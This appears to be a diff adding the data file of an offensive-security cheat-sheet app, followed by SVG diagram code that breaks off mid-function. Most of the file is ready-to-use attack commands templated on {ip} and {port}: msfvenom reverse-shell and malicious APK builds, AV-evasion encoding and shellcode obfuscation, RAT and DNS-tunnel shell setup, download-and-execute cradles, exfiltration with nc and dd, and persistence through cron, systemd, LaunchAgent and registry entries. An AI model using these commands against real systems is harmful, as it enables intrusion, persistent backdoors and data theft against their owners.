+  { name:'Win HTA Staged',                meta:['windows','staged'],   cmd:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f hta-psh -o payload.hta' },
+  { name:'Win Bind TCP x64',              meta:['windows','bind'],     cmd:'msfvenom -p windows/x64/shell/bind_tcp LPORT={port} -f exe -o bind.exe' },
+  { name:'Win Bind BOF Shellcode',        meta:['windows','bind'],     cmd:"msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\\x00' -f python -v notBuf -o shellcode" },
+  // Linux
+  { name:'Linux x64 Meterpreter Staged',  meta:['linux','staged'],     cmd:'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf' },
+  { name:'Linux x64 Shell Stageless',     meta:['linux','stageless'],  cmd:'msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf' },
+  { name:'Linux x86 Shell Stageless',     meta:['linux','stageless'],  cmd:'msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf' },
+  // macOS
+  { name:'macOS Meterpreter Staged',      meta:['mac','staged'],       cmd:'msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho' },
+  { name:'macOS Shell Stageless',         meta:['mac','stageless'],    cmd:'msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho' },
+  // Android / iOS
+  { name:'Android Meterpreter',           meta:['android'],            cmd:'msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={ip} lport={port} R -o malicious.apk' },
+  { name:'Android Meterpreter Embed',     meta:['android'],            cmd:'msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk' },
+  { name:'iOS Meterpreter Inline',        meta:['ios'],                cmd:'msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost={ip} lport={port} -f macho -o payload' },
+  // Web
+  { name:'PHP Meterpreter Stageless',     meta:['linux','windows','stageless'], cmd:'msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.php' },
+  { name:'PHP Reverse PHP',               meta:['linux','windows','stageless'], cmd:'msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -o shell.php' },
+  { name:'JSP Stageless',                 meta:['linux','windows','stageless'], cmd:'msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.jsp' },
+  { name:'WAR Stageless',                 meta:['linux','windows','stageless'], cmd:'msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war' },
+  // Scripts
+  { name:'Python Stageless',              meta:['linux','windows','stageless'], cmd:'msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw' },
+  { name:'Bash Stageless',                meta:['linux','stageless'],  cmd:'msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw -o shell.sh' },
+  // Encoders
+  { name:'Win x86 Shikata (bypass AV)',   meta:['windows','stageless'], cmd:"msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 5 -b '\\x00' -f exe -o encoded.exe" },
+];
+
+// ── TOOLS / LISTENERS ────────────────────────────────────────────────────────
+
+const TOOLS = [
+  {
+    name: 'pwncat-cs (calebstewart)',
+    badges: ['tool','linux'],
+    desc: 'Post-exploitation platform — auto TTY upgrade, enumeration, privesc, file transfer',
+    setup: [
+      { title: 'Install via pip (venv recommended)', cmd: 'python3 -m venv pwncat-env\nsource pwncat-env/bin/activate\npip install pwncat-cs' },
+      { title: 'Or from source', cmd: 'git clone https://github.com/calebstewart/pwncat\ncd pwncat\npip install poetry && poetry install && poetry shell' },
+    ],
+    usage: [
+      { label: 'Listen for reverse shell', cmd: 'pwncat-cs -lp {port}' },
+      { label: 'Connect to bind shell', cmd: 'pwncat-cs {ip}:{port}' },
+      { label: 'Reconnect / multi-session', cmd: 'pwncat-cs --config config.yaml' },
+      { label: 'In-session: local shell', cmd: 'Ctrl+D  (toggle between local and remote)' },
+      { label: 'In-session: upload file', cmd: 'upload /local/file /remote/path' },
+      { label: 'In-session: enumerate', cmd: 'run enumerate.gather' },
+      { label: 'In-session: privesc', cmd: 'run escalate.sudo' },
+    ],
+    note: 'Requires Python 3.9+ on Linux. Windows target support is alpha.',
+  },
+  {
+    name: 'pwncat (cytopia)',
+    badges: ['tool','linux','mac','windows'],
+    desc: 'Netcat on steroids — firewall/IDS evasion, bind & reverse shells, port forwarding, Python scripting',
+    setup: [
+      { title: 'Install via pip', cmd: 'pip install pwncat' },
+      { title: 'Or from source', cmd: 'git clone https://github.com/cytopia/pwncat\ncd pwncat\npip install -r requirements.txt\npip install .' },
+      { title: 'Or static binary (no Python needed)', cmd: '# Download release binary from:\n# https://github.com/cytopia/pwncat/releases' },
+    ],
+    usage: [
+      { label: 'Reverse shell listener', cmd: 'pwncat -l -p {port}' },
+      { label: 'Self-injecting reverse shell (target)', cmd: 'pwncat -e /bin/bash {ip} {port}' },
+      { label: 'Bind shell (target listens)', cmd: 'pwncat -l -e /bin/bash -p {port}' },
+      { label: 'Connect to bind (attacker)', cmd: 'pwncat {ip} {port}' },
+      { label: 'UDP reverse shell', cmd: 'pwncat --udp -e /bin/bash {ip} {port}' },
+      { label: 'Port forward', cmd: 'pwncat -l {port} --self-inject /bin/bash {ip} {port2}' },
+      { label: 'Run with PSE script', cmd: 'pwncat --script-send script.py -e /bin/bash {ip} {port}' },
+    ],
+    note: 'Supports IPv4/IPv6, TCP/UDP, TLS, HTTP header smuggling, IDS evasion.',
+  },
+  {
+    name: 'Chashell / Chaserv',
+    badges: ['tool','linux','mac','windows','dns'],
+    desc: 'Reverse shell over DNS — bypasses restrictive firewalls using encrypted DNS traffic',
+    setup: [
+      { title: 'Prerequisites', cmd: 'go install  # Go 1.17+\n# A domain name you control' },
+      { title: 'Clone & build', cmd: 'git clone https://github.com/kost/chashell && cd chashell\nexport ENCRYPTION_KEY=$(python3 -c "import os,binascii; print(binascii.hexlify(os.urandom(32)).decode())")\nexport DOMAIN_NAME=c.yourdomain.com\nmake build-all' },
+      { title: 'DNS zone config', cmd: '; Add to your DNS zone:\nchashell 300 IN A <YOUR_SERVER_IP>\nc 300 IN NS chashell.<YOUR_DOMAIN>.' },
+    ],
+    usage: [
+      { label: 'Start server (attacker)', cmd: './chaserv' },
+      { label: 'Run client on target (Linux)', cmd: './chashell' },
+      { label: 'Run client on target (Windows)', cmd: 'chashell.exe' },
+      { label: 'Cross-compile for Windows', cmd: 'make build-all OSARCH="windows/amd64"' },
+      { label: 'Cross-compile for Linux ARM', cmd: 'make build-all OSARCH="linux/arm"' },
+    ],
+    note: 'Traffic is encrypted with XSalsa20+Poly1305. Useful when only DNS traffic is allowed out.',
+  },
+  {
+    name: 'HellShell (shellcode obfuscator)',
+    badges: ['tool','windows'],
+    desc: 'Obfuscates shellcode as MAC addresses, IPv4 or IPv6 arrays — evades signature-based AV',
+    setup: [
+      { title: 'Download release binary', cmd: '# https://gitlab.com/ORCA666/hellshell/-/releases\n# Or clone & build with Visual Studio' },
+      { title: 'Or clone source', cmd: 'git clone https://github.com/NUL0x4C/HellShell' },
+    ],
+    usage: [
+      { label: 'MAC-address obfuscation', cmd: 'HellShell.exe --mac shellcode.bin' },
+      { label: 'IPv4 obfuscation', cmd: 'HellShell.exe --ipv4 shellcode.bin' },
+      { label: 'IPv6 obfuscation', cmd: 'HellShell.exe --ipv6 shellcode.bin' },
+      { label: 'Generate shellcode with msfvenom first', cmd: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shellcode.bin' },
+      { label: 'Output', cmd: '# HellShell outputs a .cpp file with the obfuscated array\n# and the decoder function — drop both into your loader project' },
+    ],
+    note: 'Outputs C++ code with decoder. Combine with a custom loader (shellcoderunner) to execute.',
+  },
+  {
+    name: 'SSL-AES Reverse Shell',
+    badges: ['tool','windows','ssl'],
+    desc: 'C++ reverse shell with SSL/TLS transport + AES-encrypted commands in HTTP headers — evades NDR/DPI',
+    setup: [
+      { title: 'Clone repo', cmd: 'git clone https://github.com/V-i-x-x/SSL-AES-Reverse-Shell' },
+      { title: 'Extract OpenSSL', cmd: '# Unzip OpenSSLWin64.zip → C:\\OpenSSLWin64' },
+      { title: 'Visual Studio settings', cmd: '# Runtime Library: /MT\n# Include: C:\\OpenSSLWin64\\install\\include\n# Lib dir: C:\\OpenSSLWin64\\install\\lib\n# Dependencies: libssl.lib;libcrypto.lib' },
+    ],
+    usage: [
+      { label: 'Start Python listener (attacker)', cmd: 'python3 sslserver.py {ip} {port}' },
+      { label: 'Execute on target', cmd: 'SSLReverseShell.exe {ip} {port}' },
+    ],
+    note: 'Commands embedded in X-Command HTTP header over HTTPS — blends with legitimate TLS traffic.',
+  },
+  {
+    name: 'FuegoShell',
+    badges: ['tool','windows','smb'],
+    desc: 'PowerShell bind/reverse shell via named pipes on TCP 445 — no new ports, no admin needed',
+    setup: [
+      { title: 'Clone repo', cmd: 'git clone https://github.com/v1k1ngfr/fuegoshell && cd fuegoshell/fuegoshell' },
+    ],
+    usage: [
+      { label: 'Generate reverse shell oneliner', cmd: 'powershell -exec bypass .\\generate_reverse_fuegoshell.ps1\n# Copy the output and run it on the target' },
+      { label: 'Generate bind shell oneliner', cmd: 'powershell -exec bypass .\\generate_bind_fuegoshell.ps1\n# Run output on target, then connect from attacker' },
+      { label: 'Why no new port?', cmd: '# Reuses existing SMB port 445 via Windows named pipes\n# Bypasses firewall rules that block non-standard outbound ports' },
+    ],
+    note: 'No local admin required. Useful in environments where 445 is allowed outbound.',
+  },
+  {
+    name: 'CHAOS RAT',
+    badges: ['tool','linux','windows'],
+    desc: 'Go-based Remote Administration Tool with web UI — generates backdoor binaries for Windows/Linux, supports reverse shell, file ops, screenshots',
+    setup: [
+      { title: 'Prerequisites', cmd: '# Go 1.18+, Docker (optional)\ndocker --version || go version' },
+      { title: 'Clone & run (Docker — recommended)', cmd: 'git clone https://github.com/tiagorlampert/CHAOS && cd CHAOS\ndocker-compose up --build' },
+      { title: 'Or run locally with Go', cmd: 'git clone https://github.com/tiagorlampert/CHAOS && cd CHAOS\nPORT=8080 SQLITE_DATABASE=chaos go run cmd/chaos/main.go' },
+    ],
+    usage: [
+      { label: 'Open web UI (attacker)', cmd: 'http://localhost:8080\n# Default creds: username=admin password=admin (change immediately)' },
+      { label: 'Generate Windows payload via UI', cmd: '# UI → Generate → select Windows x64 → set LHOST/LPORT → Download .exe' },
+      { label: 'Generate Linux payload via UI', cmd: '# UI → Generate → select Linux x64 → set LHOST/LPORT → Download binary' },
+      { label: 'Listener auto-starts with server', cmd: '# No separate nc needed — CHAOS server handles all callbacks' },
+      { label: 'Docker compose (Linux + Windows)', cmd: 'PORT=8080 SQLITE_DATABASE=chaos docker-compose up' },
+    ],
+    note: 'Web UI provides reverse shell terminal, file browser, screenshot capture, system info. All in one binary.',
+  },
+  {
+    name: 'tmate (terminal sharing)',
+    badges: ['tool','linux','mac'],
+    desc: 'Instant terminal sharing over SSH — victim runs tmate, attacker SSH-connects. Great for LotL on servers where tmate/apt is available.',
+    setup: [
+      { title: 'Install on target (Debian/Ubuntu)', cmd: 'apt install tmate' },
+      { title: 'Install on target (macOS)', cmd: 'brew install tmate' },
+      { title: 'Install static binary (no package manager)', cmd: 'curl -Lo tmate https://github.com/tmate-io/tmate/releases/latest/download/tmate-2.4.0-static-linux-amd64.tar.xz\ntar xf tmate*.tar.xz && chmod +x tmate*/tmate' },
+    ],
+    usage: [
+      { label: 'Start session on target (shows SSH URLs)', cmd: 'tmate -S /tmp/.tmate.sock new-session -d\ntmate -S /tmp/.tmate.sock wait tmate-ready\ntmate -S /tmp/.tmate.sock display -p "#{tmate_ssh}"' },
+      { label: 'One-liner: start & print SSH URL', cmd: 'tmate -S /tmp/t new-session -d; tmate -S /tmp/t wait tmate-ready && tmate -S /tmp/t display -p "#{tmate_ssh}"' },
+      { label: 'Exfil URL to attacker via curl', cmd: 'TMATE_URL=$(tmate -S /tmp/t display -p "#{tmate_ssh}"); curl -d "$TMATE_URL" http://{ip}:{port}/' },
+      { label: 'Attacker connects (URL from above)', cmd: 'ssh <session-id>@lon1.tmate.io' },
+      { label: 'Self-hosted tmate server', cmd: '# https://github.com/tmate-io/tmate-ssh-server\ndocker run -d -p 22:22 tmate/tmate-ssh-server' },
+    ],
+    note: 'Traffic goes through tmate.io by default (or self-hosted). SSH-based — passes most SSH-allowed firewalls.',
+  },
+];
+
+const LOTL = [
+  {
+    os: 'windows',
+    title: 'Download & Execute',
+    items: [
+      { label: 'certutil — download file',       cmd: 'certutil.exe -urlcache -split -f "http://{ip}:{port}/shell.exe" C:\\Windows\\Temp\\shell.exe' },
+      { label: 'certutil — base64 decode & run', cmd: 'certutil -decode payload.b64 payload.exe && payload.exe' },
+      { label: 'bitsadmin — download & exec',    cmd: 'bitsadmin /transfer job http://{ip}:{port}/shell.exe %TEMP%\\shell.exe && %TEMP%\\shell.exe' },
+      { label: 'PowerShell download cradle',     cmd: 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://{ip}:{port}/shell.ps1\')"' },
+      { label: 'curl (Win10+)',                  cmd: 'curl -o %TEMP%\\shell.exe http://{ip}:{port}/shell.exe && %TEMP%\\shell.exe' },
+    ],
+    note: 'certutil & bitsadmin are signed Microsoft binaries — bypass most application whitelists.',
+  },
+  {
+    os: 'windows',
+    title: 'Code Execution (LOLBAS)',
+    items: [
+      { label: 'mshta — exec remote HTA',              cmd: 'mshta.exe "http://{ip}:{port}/shell.hta"' },
+      { label: 'regsvr32 (Squiblydoo) — exec SCT',     cmd: 'regsvr32.exe /s /n /u /i:http://{ip}:{port}/shell.sct scrobj.dll' },
+      { label: 'rundll32 — exec remote SCT via JS',    cmd: 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://{ip}:{port}/shell.sct")' },
+      { label: 'MSBuild — inline C# task execution',   cmd: 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe shell.csproj' },
+      { label: 'InstallUtil — AppDomain bypass',       cmd: 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U shell.exe' },
+      { label: 'wmic — remote process create',         cmd: 'wmic /node:{ip} process call create "cmd.exe /c shell.exe"' },
+      { label: 'forfiles — indirect cmd execution',    cmd: 'forfiles /p C:\\Windows\\System32 /m notepad.exe /c "cmd /c shell.exe"' },
+    ],
+    note: 'All binaries are Microsoft-signed. Reference: lolbas-project.github.io',
+  },
+  {
+    os: 'windows',
+    title: 'Persistence',
+    items: [
+      { label: 'Registry Run key',                   cmd: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "C:\\Windows\\Temp\\shell.exe" /f' },
+      { label: 'Scheduled task (on logon)',           cmd: 'schtasks /create /tn "WinUpdate" /tr "C:\\Windows\\Temp\\shell.exe" /sc onlogon /ru SYSTEM /f' },
+      { label: 'Scheduled task (every minute)',       cmd: 'schtasks /create /tn "WinUpdate" /tr "cmd /c shell.exe" /sc minute /mo 1 /f' },
+      { label: 'Startup folder',                     cmd: 'copy shell.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe"' },
+      { label: 'WMI event subscription (fileless)',   cmd: '# Creates permanent WMI subscription — runs cmd on OS events\npowershell -c "Set-WMIInstance -Class __EventFilter ..."' },
+    ],
+    note: 'Scheduled tasks and registry keys survive reboots without dropped binaries.',
+  },
+  {
+    os: 'linux',
+    title: 'Download & Execute',
+    items: [
+      { label: 'curl pipe to bash',            cmd: 'curl -fsSL http://{ip}:{port}/shell.sh | bash' },
+      { label: 'wget pipe to bash',            cmd: 'wget -qO- http://{ip}:{port}/shell.sh | bash' },
+      { label: 'Python3 fetch & exec',         cmd: 'python3 -c "import urllib.request,os; exec(urllib.request.urlopen(\'http://{ip}:{port}/shell.py\').read())"' },
+      { label: 'Perl fetch & eval',            cmd: 'perl -e "use LWP::Simple; eval(get(\'http://{ip}:{port}/shell.pl\'))"' },
+      { label: 'Python3 HTTP server (serve)',  cmd: 'python3 -m http.server {port}' },
+    ],
+    note: 'curl and wget are present on virtually all Linux systems. python3 available on most modern distros.',
+  },
+  {
+    os: 'linux',
+    title: 'File Transfer',
+    items: [
+      { label: 'nc send file',                cmd: '# Receiver:\nnc -lvnp {port} > received.bin\n# Sender:\nnc {ip} {port} < secret.zip' },
+      { label: 'socat file transfer',         cmd: '# Receiver (attacker):\nsocat TCP-LISTEN:{port},reuseaddr OPEN:received,creat\n# Sender (target):\nsocat TCP:{ip}:{port} FILE:secret.zip' },
+      { label: 'dd over nc',                  cmd: 'dd if=/dev/sda | nc {ip} {port}' },
+      { label: 'base64 encode & paste',       cmd: 'base64 -w0 secret.zip && echo\n# On receiver: echo "<base64>" | base64 -d > secret.zip' },
+      { label: 'scp (if ssh available)',       cmd: 'scp secret.zip user@{ip}:/tmp/' },
+    ],
+    note: 'dd is useful for raw disk images. base64 works when only terminal copy-paste is available.',
+  },
+  {
+    os: 'linux',
+    title: 'Tunneling & Pivoting',
+    items: [
+      { label: 'SSH reverse tunnel',              cmd: 'ssh -R {port}:localhost:22 user@{ip}\n# Attacker: ssh localhost -p {port}' },
+      { label: 'SSH local port forward',          cmd: 'ssh -L {port}:internal-host:80 pivot@{ip}' },
+      { label: 'SSH SOCKS5 proxy',                cmd: 'ssh -D 1080 user@{ip}\n# Then: proxychains nmap ...' },
+      { label: 'Chisel reverse SOCKS (attacker)', cmd: 'chisel server -p {port} --reverse' },
+      { label: 'Chisel reverse SOCKS (target)',   cmd: 'chisel client {ip}:{port} R:socks' },
+    ],
+    note: 'SSH tunnels are encrypted and blend with legitimate traffic. Chisel requires binary on target.',
+  },
+  {
+    os: 'linux',
+    title: 'Persistence',
+    items: [
+      { label: 'crontab every minute',            cmd: '(crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/{ip}/{port} 0>&1") | crontab -' },
+      { label: 'rc.local (SysV)',                 cmd: 'echo "bash -i >& /dev/tcp/{ip}/{port} 0>&1 &" >> /etc/rc.local' },
+      { label: '.bashrc / .profile',              cmd: 'echo "bash -i >& /dev/tcp/{ip}/{port} 0>&1" >> ~/.bashrc' },
+      { label: 'systemd user service',            cmd: 'mkdir -p ~/.config/systemd/user\ncat > ~/.config/systemd/user/update.service <<EOF\n[Unit]\nDescription=update\n[Service]\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"\nRestart=always\n[Install]\nWantedBy=default.target\nEOF\nsystemctl --user enable update && systemctl --user start update' },
+      { label: 'LD_PRELOAD shared library hijack', cmd: 'echo \'void _init(){system("bash -i >& /dev/tcp/{ip}/{port} 0>&1");}\' > /tmp/p.c\ngcc -shared -fPIC -nostartfiles -o /tmp/p.so /tmp/p.c\nLD_PRELOAD=/tmp/p.so some_suid_binary' },
+    ],
+    note: 'crontab is most reliable. systemd user services survive reboots without root.',
+  },
+  {
+    os: 'mac',
+    title: 'Download & Execute',
+    items: [
+      { label: 'curl pipe to bash',              cmd: 'curl -fsSL http://{ip}:{port}/shell.sh | bash' },
+      { label: 'osascript — run AppleScript',    cmd: 'osascript -e \'do shell script "bash -i >& /dev/tcp/{ip}/{port} 0>&1 &"\'' },
+      { label: 'open — exec downloaded file',    cmd: 'curl -o /tmp/shell http://{ip}:{port}/shell && chmod +x /tmp/shell && open /tmp/shell' },
+    ],
+    note: 'curl is present on all macOS versions. osascript can bypass some script restrictions.',
+  },
+  {
+    os: 'mac',
+    title: 'Persistence',
+    items: [
+      { label: 'LaunchAgent plist',   cmd: 'cat > ~/Library/LaunchAgents/com.update.plist <<EOF\n<?xml version="1.0"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0"><dict>\n  <key>Label</key><string>com.update</string>\n  <key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>bash -i >& /dev/tcp/{ip}/{port} 0>&1</string></array>\n  <key>RunAtLoad</key><true/>\n  <key>KeepAlive</key><true/>\n</dict></plist>\nEOF\nlaunchctl load ~/Library/LaunchAgents/com.update.plist' },
+      { label: 'crontab (macOS)',     cmd: '(crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/{ip}/{port} 0>&1") | crontab -' },
+    ],
+    note: 'LaunchAgents survive reboots and are loaded per-user without root. Check: ~/Library/LaunchAgents/',
+  },
+];
+
+// ── DIAGRAM ENGINE ───────────────────────────────────────────────────────────
+
+let _dId = 0;
+
+function getDiagram(type, port) {
+  const id = ++_dId;
+  const W = 460, H = 120;
+  const ACX = 62, VCX = 398;
+  const LA = ACX + 40, RV = VCX - 40;
+
+  // ── Arrowhead markers
+  const mkr = (mid, col, flip) => {
+    const pts = flip ? `M7,0.5 L7,6.5 L0,3.5z` : `M0,0.5 L0,6.5 L7,3.5z`;
+    const rx  = flip ? 2 : 5;
+    return `<marker id="${mid}" markerWidth="7" markerHeight="7" refX="${rx}" refY="3.5" orient="auto"><path d="${pts}" fill="${col}"/></marker>`;
+  };
+
+  // ── Animated flowing line: glow halo + dashed animated stroke + arrowhead
+  // dir: 'r' = left→right (dashoffset negative), 'l' = right→left (positive)
+  const aline = (x1,y1,x2,y2, col, mEnd='', mStart='', speed=1.4, dash='8,5') => {
+    const len = Math.hypot(x2-x1, y2-y1);
+    const dashTotal = 13; // 8+5
+    const dur = (len / (dashTotal * speed)).toFixed(2) + 's';
+    const dir = x2 > x1 ? -dashTotal : dashTotal;
+    const me = mEnd   ? ` marker-end="${mEnd}"`   : '';
+    const ms = mStart ? ` marker-start="${mStart}"` : '';
+    const da = `stroke-dasharray="${dash}"`;
+    return (
+      // halo
+      `<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" stroke="${col}" stroke-width="6" stroke-opacity="0.13" ${da}/>` +
+      // animated dashes
+      `<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" stroke="${col}" stroke-width="1.6" ${da}${me}${ms}>` +
+        `<animate attributeName="stroke-dashoffset" from="0" to="${dir}" dur="${dur}" repeatCount="indefinite"/>` +
+      `</line>`
+    );
+  };
+
+  // ── Solid glowing line with pulse
+  const solidLine = (x1,y1,x2,y2, col, mEnd='', mStart='') => {
+    const me = mEnd   ? ` marker-end="${mEnd}"`   : '';
+    const ms = mStart ? ` marker-start="${mStart}"` : '';
+    return (
+      `<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" stroke="${col}" stroke-width="6" stroke-opacity="0.15"/>` +
+      `<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" stroke="${col}" stroke-width="1.8"${me}${ms}>` +
+        `<animate attributeName="stroke-opacity" values="1;0.5;1" dur="2s" repeatCount="indefinite"/>` +
+      `</line>`
+    );
+  };
+
+  // ── Moving dot packet along a path
+  const packet = (x1,y1,x2,y2, col, delay='0s', dur='1.8s') =>
+    `<circle r="2.5" fill="${col}" opacity="0.9">` +
+      `<animate attributeName="cx" from="${x1}" to="${x2}" dur="${dur}" begin="${delay}" repeatCount="indefinite"/>` +
+      `<animate attributeName="cy" from="${y1}" to="${y2}" dur="${dur}" begin="${delay}" repeatCount="indefinite"/>` +
+      `<animate attributeName="opacity" values="0;1;1;0" dur="${dur}" begin="${delay}" repeatCount="indefinite"/>` +
+    `</circle>`;
+
+  // ── Laptop with pulsing screen glow
+  const laptop = (cx, sc, sf, lbl, sub) =>
+    `<rect x="${cx-32}" y="8" width="64" height="44" rx="3" fill="#080808" stroke="${sc}" stroke-width="1.4">` +
+      `<animate attributeName="stroke-opacity" values="1;0.5;1" dur="3s" repeatCount="indefinite"/>` +
+    `</rect>` +
+    `<rect x="${cx-27}" y="13" width="54" height="34" rx="1" fill="${sf}">` +
+      `<animate attributeName="fill-opacity" values="1;0.7;1" dur="3s" repeatCount="indefinite"/>` +
+    `</rect>` +
+    `<rect x="${cx-38}" y="52" width="76" height="5" rx="1" fill="${sc}" opacity="0.20"/>` +
+    `<rect x="${cx-44}" y="57" width="88" height="3" rx="1" fill="${sc}" opacity="0.08"/>` +
+    `<text x="${cx}" y="74" text-anchor="middle" font-family="monospace" font-size="9" fill="#555">${lbl}</text>` +
+    `<text x="${cx}" y="86" text-anchor="middle" font-family="monospace" font-size="8" fill="${sc}">${sub}</text>`;
+
+  const t = (x,y,txt,col,s=7.5) =>
+    `<text x="${x}" y="${y}" text-anchor="middle" font-family="monospace" font-size="${s}" fill="${col}">${txt}</text>`;
+
+  const label = (x,y,main,sub,mc,sc2) =>
+    `${t(x,y,main,mc,7.5)}${t(x,y+10,sub,sc2,6.5)}`;
+
+  const bg = `<rect width="${W}" height="${H}" fill="#030a03" rx="3"/>`;
+
+  // ── Step badge
+  const step = (x,y,n,col) =>
+    `<rect x="${x-8}" y="${y-9}" width="16" height="12" rx="2" fill="${col}" opacity="0.18"/>` +
+    `<text x="${x}" y="${y}" text-anchor="middle" font-family="monospace" font-size="8" fill="${col}" font-weight="bold">${n}</text>`;
+
+  switch(type) {
+
+    // ── REVERSE SHELL ──────────────────────────────────────────────────────
+    case 'reverse': {
+      const D = `<defs>
+        ${mkr(`lb${id}`, '#4488ff', true)}
+        ${mkr(`rr${id}`, '#ff4444', false)}
+        ${mkr(`lr${id}`, '#ff6622', true)}
+      </defs>`;
+      const atk = laptop(ACX, '#4488ff', '#00091a', 'ATTACKER', `:${port} LISTEN`);
+      const vic = laptop(VCX, '#ff4444', '#1a0000', 'VICTIM', ':random');
+      // ① TCP connect-back — solid pulsing blue line victim→attacker
+      const c1 = solidLine(RV,26, LA,26, '#4488ff', `url(#lb${id})`);
+      // ② cmd — animated dashes attacker→victim (red)
+      const c2 = aline(LA,40, RV,40, '#ff4444', `url(#rr${id})`, '', 1.2);
+      // ③ output — animated dashes victim→attacker (orange)
+      const c3 = aline(RV,54, LA,54, '#ff6622', '', `url(#lr${id})`, 1.0);
+      // packets
+      const p1 = packet(RV,26, LA,26, '#88aaff', '0s',   '1.6s');
+      const p2 = packet(LA,40, RV,40, '#ff6666', '0.4s', '1.9s');
+      const p3 = packet(RV,54, LA,54, '#ff9955', '0.8s', '2.1s');
+      return `<svg viewBox="0 0 ${W} ${H}" xmlns="http://www.w3.org/2000/svg">${bg}${D}${atk}${vic}${c1}${c2}${c3}${p1}${p2}${p3}
+        ${label(243,22,'① TCP connect-back','victim → attacker','#6699ff','#334488')}
+        ${label(243,37,'② commands','attacker → victim','#ff6666','#883333')}
+        ${label(243,56,'③ output','victim → attacker','#ff9955','#884422')}
+        ${t(230,112,'victim initiates — bypasses inbound firewall rules','#333',7)}
+      </svg>`;
+    }
+
+    // ── BIND SHELL ─────────────────────────────────────────────────────────
+    case 'bind': {
+      const D = `<defs>
+        ${mkr(`rb${id}`, '#4488ff', false)}
+        ${mkr(`rr${id}`, '#ff4444', false)}
+        ${mkr(`lr${id}`, '#ff6622', true)}
+      </defs>`;
+      const atk = laptop(ACX, '#4488ff', '#00091a', 'ATTACKER', 'connects');
+      const vic = laptop(VCX, '#ff4444', '#1a0000', 'VICTIM', `:${port} LISTEN`);
+      const c1 = solidLine(LA,26, RV,26, '#4488ff', `url(#rb${id})`);
+      const c2 = aline(LA,40, RV,40, '#ff4444', `url(#rr${id})`, '', 1.2);
+      const c3 = aline(RV,54, LA,54, '#ff6622', '', `url(#lr${id})`, 1.0);
+      const p1 = packet(LA,26, RV,26, '#88aaff', '0s',   '1.6s');
+      const p2 = packet(LA,40, RV,40, '#ff6666', '0.5s', '1.9s');
+      const p3 = packet(RV,54, LA,54, '#ff9955', '0.9s', '2.0s');
+      return `<svg viewBox="0 0 ${W} ${H}" xmlns="http://www.w3.org/2000/svg">${bg}${D}${atk}${vic}${c1}${c2}${c3}${p1}${p2}${p3}
+        ${label(243,22,'① attacker connects','to victim port ${port}','#6699ff','#334488').replace('${port}',port)}
+        ${label(243,37,'② commands','attacker → victim','#ff6666','#883333')}
+        ${label(243,56,'③ output','victim → attacker','#ff9955','#884422')}
+        ${t(230,112,'victim listens — attacker must reach victim port directly','#333',7)}
+      </svg>`;
+    }
+
+    // ── DNS TUNNEL ─────────────────────────────────────────────────────────
+    case 'dns': {
+      const DNX = 230;
+      const D = `<defs>
+        ${mkr(`lg${id}`, '#00cc44', true)}
+        ${mkr(`rg${id}`, '#00cc44', false)}
+      </defs>`;
+      const atk = laptop(55,  '#00cc44', '#001400', 'ATTACKER', 'NS record');
+      const vic = laptop(405, '#ff4444', '#1a0000', 'VICTIM',   'DNS client');
+      const dnsBox =
+        `<rect x="${DNX-38}" y="12" width="76" height="38" rx="4" fill="#0a0a02" stroke="#888800" stroke-width="1.2">` +
+          `<animate attributeName="stroke-opacity" values="1;0.4;1" dur="2.5s" repeatCount="indefinite"/>` +
+        `</rect>` +
+        `${t(DNX,27,'DNS','#aaaa00',9)}${t(DNX,40,'nameserver','#555',7)}` +
+        `${t(DNX,78,'your domain NS','#444',7)}`;
+      // victim → DNS nameserver (query)
+      const v2d = aline(363,24, DNX+42,24, '#00cc44', `url(#lg${id})`, '', 1.3);
+      // DNS → attacker (forward)
+      const d2a = aline(DNX-42,24, 93,24,  '#00cc44', `url(#lg${id})`, '', 1.3);
+      // responses (dashed, slower)
+      const r1 = aline(93,38,  DNX-42,38, '#00aa33', `url(#rg${id})`, '', 0.8, '4,4');
